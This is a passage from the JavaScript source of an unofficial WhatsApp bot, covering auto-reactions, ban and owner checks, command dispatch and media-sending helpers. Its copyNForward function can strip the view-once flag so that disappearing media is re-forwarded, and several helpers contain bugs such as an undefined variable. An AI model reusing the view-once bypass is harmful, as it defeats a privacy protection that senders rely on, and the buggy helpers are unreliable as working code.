'👀', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰', '🧳', '🌉', '🌁', '🛤️', '🛣️', '🏚️', '🏠', '🏡', '🧀', '🍥', '🍮', '🍰', '🍦', '🍨', '🍧', '🥠', '🍡', '🧂', '🍯', '🍪', '🍩', '🍭', '🥮', '🍡'
        ];
        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
        m.react(randomReaction);
      }
    }
	            	  
    // custum react settings        
                        
    // Custom React for all messages (public and owner)
    if (!isReact && config.CUSTOM_REACT === 'true') {
      // Use custom emojis from the configuration (fallback to default if not set)
      const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
      m.react(randomReaction);
    }

    if (!isReact && senderNumber === botNumber) {
      if (config.HEART_REACT === 'true') {
        // Use custom emojis from the configuration
        const reactions = (config.CUSTOM_REACT_EMOJIS || '❤️,🧡,💛,💚,💚').split(',');
        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
        m.react(randomReaction);
      }
    }
        
    // ban users 

    // Banned users check
    const bannedUsers = JSON.parse(fsSync.readFileSync("./lib/ban.json", "utf-8"));
    const isBanned = bannedUsers.includes(sender);
    if (isBanned) {
      console.log(chalk.red(`[ 🚫 ] Ignored command from banned user: ${sender}`));
      return;
    }

    // Owner check
    const ownerFile = JSON.parse(fsSync.readFileSync("./lib/sudo.json", "utf-8"));
    const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
    const isFileOwner = ownerFile.includes(sender);
    const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;

    // Mode restrictions
    if (!isRealOwner && config.MODE === "private") {
      console.log(chalk.red(`[ 🚫 ] Ignored command in private mode from ${sender}`));
      return;
    }
    if (!isRealOwner && isGroup && config.MODE === "inbox") {
      console.log(chalk.red(`[ 🚫 ] Ignored command in group ${groupName} from ${sender} in inbox mode`));
      return;
    }
    if (!isRealOwner && !isGroup && config.MODE === "groups") {
      console.log(chalk.red(`[ 🚫 ] Ignored command in private chat from ${sender} in groups mode`));
      return;
    }
	  
	  // take commands 
                 
    const events = require('./malvin')
    const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
    if (isCmd) {
      const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
      if (cmd) {
        if (cmd.react) malvin.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
  
        try {
          cmd.function(malvin, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
        } catch (e) {
          console.error("[PLUGIN ERROR] " + e);
        }
      }
    }
    
    events.commands.map(async(command) => {
      if (body && command.on === "body") {
        command.function(malvin, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
      } else if (mek.q && command.on === "text") {
        command.function(malvin, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
      } else if (
        (command.on === "image" || command.on === "photo") &&
        mek.type === "imageMessage"
      ) {
        command.function(malvin, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
      } else if (
        command.on === "sticker" &&
        mek.type === "stickerMessage"
      ) {
        command.function(malvin, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
      }
    });
  });
  //===================================================   
  malvin.decodeJid = jid => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (
        (decode.user &&
          decode.server &&
          decode.user + '@' + decode.server) ||
        jid
      );
    } else return jid;
  };
  //===================================================
  malvin.copyNForward = async(jid, message, forceForward = false, options = {}) => {
    let vtype
    if (options.readViewOnce) {
      message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
      vtype = Object.keys(message.message.viewOnceMessage.message)[0]
      delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
      delete message.message.viewOnceMessage.message[vtype].viewOnce
      message.message = {
        ...message.message.viewOnceMessage.message
      }
    }
  
    let mtype = Object.keys(message.message)[0]
    let content = await generateForwardMessageContent(message, forceForward)
    let ctype = Object.keys(content)[0]
    let context = {}
    if (mtype != "conversation") context = message.message[mtype].contextInfo
    content[ctype].contextInfo = {
      ...context,
      ...content[ctype].contextInfo
    }
    const waMessage = await generateWAMessageFromContent(jid, content, options ? {
      ...content[ctype],
      ...options,
      ...(options.contextInfo ? {
        contextInfo: {
          ...content[ctype].contextInfo,
          ...options.contextInfo
        }
      } : {})
    } : {})
    await malvin.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
    return waMessage
  }
  //=================================================
  malvin.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
    let quoted = message.msg ? message.msg : message
    let mime = (message.msg || message).mimetype || ''
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
    const stream = await downloadContentFromMessage(quoted, messageType)
    let buffer = Buffer.from([])
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk])
    }
    let type = await FileType.fromBuffer(buffer)
    trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
    // save to file
    await fs.writeFileSync(trueFileName, buffer)
    return trueFileName
  }
  //=================================================
  malvin.downloadMediaMessage = async(message) => {
    let mime = (message.msg || message).mimetype || ''
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
    const stream = await downloadContentFromMessage(message, messageType)
    let buffer = Buffer.from([])
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk])
    }
  
    return buffer
  }
  
  /**
  *
  * @param {*} jid
  * @param {*} message
  * @param {*} forceForward
  * @param {*} options
  * @returns
  */
  //================================================
  malvin.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
    let mime = '';
    let res = await axios.head(url)
    mime = res.headers['content-type']
    if (mime.split("/")[1] === "gif") {
      return malvin.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
    }
    let type = mime.split("/")[0] + "Message"
    if (mime === "application/pdf") {
      return malvin.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
    }
    if (mime.split("/")[0] === "image") {
      return malvin.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
    }
    if (mime.split("/")[0] === "video") {
      return malvin.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
    }
    if (mime.split("/")[0] === "audio") {
      return malvin.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
    }
  }
  //==========================================================
  malvin.cMod = (jid, copy, text = '', sender = malvin.user.id, options = {}) => {
    //let copy = message.toJSON()
    let mtype = Object.keys(copy.message)[0]
    let isEphemeral = mtype === 'ephemeralMessage'
    if (isEphemeral) {
      mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
    }
    let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
    let content = msg[mtype]
    if (typeof content === 'string') msg[mtype] = text || content
    else if (content.caption) content.caption = text || content.caption
    else if (content.text) content.text = text || content.text
    if (typeof content !== 'string') msg[mtype] = {
      ...content,
      ...options
    }
    if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
    else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
    if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
    else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
    copy.key.remoteJid = jid
    copy.key.fromMe = sender === malvin.user.id
  
    return proto.WebMessageInfo.fromObject(copy)
  }
  
  /**
  *
  * @param {*} path
  * @returns
  */
  //=====================================================
  malvin.getFile = async(PATH, save) => {
    let res
    let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
    //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
    let type = await FileType.fromBuffer(data) || {
      mime: 'application/octet-stream',
      ext: '.bin'
    }
    let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
    if (data && save) fs.promises.writeFile(filename, data)
    return {
      res,
      filename,
      size: await getSizeMedia(data),
      ...type,
      data
    }
  }
  //=====================================================
  malvin.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
    let types = await malvin.getFile(PATH, true)
    let { filename, size, ext, mime, data } = types
    let type = '',
      mimetype = mime,
      pathFile = filename
    if (options.asDocument) type = 'document'
    if (options.asSticker || /webp/.test(mime)) {
      let { writeExif } = require('./exif.js')
      let media = { mimetype: mime, data }
      pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
      await fs.promises.unlink(filename)
      type = 'sticker'
      mimetype = 'image/webp'
    } else if (/image/.test(mime)) type = 'image'
    else if (/video/.test(mime)) type = 'video'
    else if (/audio/.test(mime)) type = 'audio'
    else type = 'document'
    await malvin.sendMessage(jid, {
      [type]: { url: pathFile },
      mimetype,
      fileName,
      ...options
    }, { quoted, ...options })
    return fs.promises.unlink(pathFile)
  }
  //=====================================================
  malvin.parseMention = async(text) => {
    return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
  }
  //=====================================================
  malvin.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
    let types = await malvin.getFile(path, true)
    let { mime, ext, res, data, filename } = types
    if (res && res.status !== 200 || file.length <= 65536) {
      try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
    }
    let type = '',
      mimetype = mime,
      pathFile = filename
    if (options.asDocument) type = 'document'
    if (options.asSticker || /webp/.test(mime)) {
      let { writeExif } = require('./exif')
      let media = { mimetype: mime, data }
      pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
      await fs.promises.unlink(filename)
      type = 'sticker'
      mimetype = 'image/webp'
    } else if (/image/.test(mime)) type = 'image'
    else if (/video/.test(mime)) type = 'video'
    else if (/audio/.test(mime)) type = 'audio'
    else type = 'document'
    await malvin.sendMessage(jid, {
      [type]: { url: pathFile },
      caption,
      mimetype,
      fileName,
      ...options
    }, { quoted, ...options })
    return fs.promises.unlink(pathFile)
  }
  /**
  *
  * @param {*} message
  * @param {*} filename
  * @param {*} attachExtension
  * @returns
  */
  //=====================================================
  malvin.sendVideoAsSticker = async (jid, buff, options = {}) => {
    let buffer;
    if (options && (options.packname || options.author)) {
      buffer = await writeExifVid(buff, options);
    } else {
      buffer = await videoToWebp(buff);
    }
    await malvin.sendMessage(
      jid,
      { sticker: { url: buffer }, ...options },
      options
    );
  };
  //=====================================================
  malvin.sendImageAsSticker = async (jid, buff, options = {}) => {
    let buffer;
    if (options && (options.packname || options.author)) {
      buffer = await writeExifImg(buff, options);
    } else {
      buffer = await imageToWebp(buff);
    }
    await malvin.sendMessage(
      jid,
      { sticker: { url: buffer }, ...options },
      options
    );
  };
  /**
  *
  * @param {*} jid
  * @param {*} path
  * @param {*} quoted
  * @param {*} options
  * @returns
  */
  //=====================================================
  malvin.sendTextWithMentions = async(jid, text, quoted, options = {}) => malvin.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
  
  /**
  *
  * @param {*} jid
  * @param {*} path
  * @param {*} quoted
  * @param {*} options
  * @returns
  */
  //=====================================================
  malvin.sendImage = async(jid, path, caption = '', quoted = '', options) => {
    let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
    return await malvin.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
  }
  
  /**
  *
  * @param {*} jid
  * @param {*} path
  * @param {*} caption
  * @param {*} quoted
  * @param {*} options
  * @returns
  */
  //=====================================================
  malvin.sendText = (jid, text, quoted = '', options) => malvin.sendMessage(jid, { text: text, ...options }, { quoted })
  
  /**
  *
  * @param {*} jid
  * @param {*} buttons
  * @param {*} caption
  * @param {*} footer
  * @param {*} quoted
  * @param {*} options
  */
  //=====================================================
  malvin.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
    let buttonMessage = {
      text,
      footer,
      buttons,
      headerType: 2,
      ...options
    }
    //========================================================================================================================================
    malvin.sendMessage(jid, buttonMessage, { quoted, ...options })
  }
  //=====================================================
  malvin.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
    let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: malvin.waUploadToServer })
    var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
      templateMessage: {
        hydratedTemplate: {
          imageMessage: message.imageMessage,
          "hydratedContentText": text,
          "hydratedFooterText": footer,
          "hydratedButtons": but
        }
      }
    }), options)
    malvin.relayMessage(jid, template.message, { messageId: template.key.id })
  }
  
  /**
  *
  * @param {*} jid
  * @param {*} buttons
  * @param {*} caption
  * @param {*} footer
  * @param {*} quoted
  * @param {*} options
  */
  //=====================================================
  malvin.getName = (jid, withoutContact = false) => {
    id = malvin.decodeJid(jid);

    withoutContact = malvin.withoutContact || withoutContact;

    let v;

    if (id.endsWith('@g.us'))
      return new Promise(async resolve => {
        v = store.contacts[id] || {};

        if (!(v.name.notify || v.subject))
          v = malvin.groupMetadata(id) || {};

        resolve(
          v.name ||
          PhoneNumber(
            '+' + id.replace('@s.whatsapp.net', ''),
          ).getNumber('international'),
        );
      });
    else
      v =
        id === '0@s.whatsapp.net'
          ? {
            id,
            name: 'WhatsApp',
          }
          : id === malvin.decodeJid(malvin.user.id)
            ? malvin.user
            : store.contacts[id] || {};

    return (
      (withoutContact ? '' : v.name) ||
      v.subject ||
      v.verifiedName ||
      PhoneNumber(
        '+' + jid.replace('@s.whatsapp.net', ''),
      ).getNumber('international')
    );
  };

  // Vcard Functionality
  malvin.sendContact = async (jid, kon, quoted = '', opts = {}) => {
    let list = [];
    for (let i of kon) {
      list.push({
        displayName: await malvin.getName(i + '@s.whatsapp.net'),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await malvin.getName(
          i + '@s.whatsapp.net',
        )}\nFN:${
          global.OwnerName
        }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
          global.email
        }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
          global.github
        }/Mercedes\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
          global.location
        };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
      });
    }
    malvin.sendMessage(
      jid,
      {
        contacts: {
          displayName: `${list.length} Contact`,
          contacts: list,
        },
        ...opts,
      },
      { quoted },
    );
  };

  // Status aka brio
  malvin.setStatus = status => {
    malvin.query({
      tag: 'iq',
      attrs: {
        to: '@s.whatsapp.net',
        type: 'set',
        xmlns: 'status',
      },
      content: [
        {
          tag: 'status',
          attrs: {},
          content: Buffer.from(status, 'utf-8'),
        },
      ],
    });
    return status;
  };
  malvin.serializeM = mek => sms(malvin, mek, store);
}

//web server

app.use(express.static(path.join(__dirname, "lib")));

app.get("/", (req, res) => {
  res.redirect("/marisel.html");
});
app.listen(port, () =>
  console.log(chalk.cyan(`
╭──[ hello user ]─
│🤗 hi your bot is live 
╰──────────────`))
);

// Call session health check after startup
setTimeout(() => {
  checkSessionHealth();
}, 3000);

setTimeout(() => {
  connectToWA();
}, 4000);

////GuruTech 
